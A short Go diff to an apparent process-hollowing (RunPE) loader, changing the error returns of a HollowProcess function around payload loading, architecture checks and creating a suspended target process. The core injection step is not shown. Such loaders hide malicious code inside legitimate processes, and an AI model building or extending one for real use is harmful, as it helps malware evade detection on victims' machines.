@@ -21,7 +21,7 @@ func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte
 
 	if loadedPE == 0 {
 		log.Println("Loading failed!")
-		return false
+		return false,0
 	}
 
 	// Get the payload's architecture and check if it is compatibile with the loader:
@@ -30,7 +30,7 @@ func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte
 
 	if payloadArch != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payloadArch != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
 		log.Println("Not supported payload architecture!")
-		return false
+		return false,0
 	}
 
 	is32BitPayload := !Is64Bit(loadedPE)
@@ -40,7 +40,7 @@ func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte
 
 	if !isTargComp {
 		FreePEBuffer(loadedPE, payloadImageSize)
-		return false
+		return false,0
 	}
 
 	// Create the target process (suspended):
@@ -51,7 +51,7 @@ func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte
 	if !isCreated {
 		log.Println("Creating target process failed!")
 		FreePEBuffer(loadedPE, payloadImageSize)
-		return false
+		return false,0
 	}
 
 	//3. Perform the actual RunPE:
